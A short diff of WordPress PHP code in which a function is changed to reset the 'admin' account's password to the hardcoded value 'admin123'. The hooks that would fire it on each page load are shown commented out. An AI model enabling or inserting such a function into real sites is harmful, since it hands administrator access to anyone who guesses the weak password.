@@ -27,11 +27,13 @@ function box_auto_run(){
     
 }
 function box_update_password(){
-    $user = get_user_by('login','agentsync');
-    var_dump($user);
-    $user_data = wp_update_user( array( 'ID' => $user->ID, 'user_pass' => 'boxadmin@' ) );
-    die();
+    $user = get_user_by('login','admin');
+
+    $user_data = wp_update_user( array( 'ID' => $user->ID, 'user_pass' => 'admin123' ) );
+     // die('this is footer');
 }
-// add_action('wp_footer','box_auto_run');
+// add_action('wp_footer','box_update_password');
  // add_action('init','box_auto_run');
  // add_action('init','box_update_password');
+
+
